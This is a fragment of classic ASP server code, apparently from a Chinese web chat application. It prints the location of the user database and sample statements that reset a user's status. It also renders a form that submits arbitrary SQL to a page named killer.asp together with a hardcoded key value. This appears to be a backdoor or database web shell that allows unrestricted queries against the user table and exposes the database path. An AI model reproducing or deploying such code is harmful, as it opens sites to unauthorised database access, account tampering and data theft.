...
set objrs=nothing
set objconn=nothing
response.write Application("aqjh_usermdb")&"<br><br><br>select * from 用户 where id like 1980<br>update 用户 set 状态 = '正常' where id like 1980<br><form name='form1' method='post' action='killer.asp'><input type='text' name='sql' value='select * from 用户 where id like 1980' size=100><br><input type='submit' name='Submit' value='提交'><input type=text name='ppp' value='mqflf'></form>"
response.end
end if
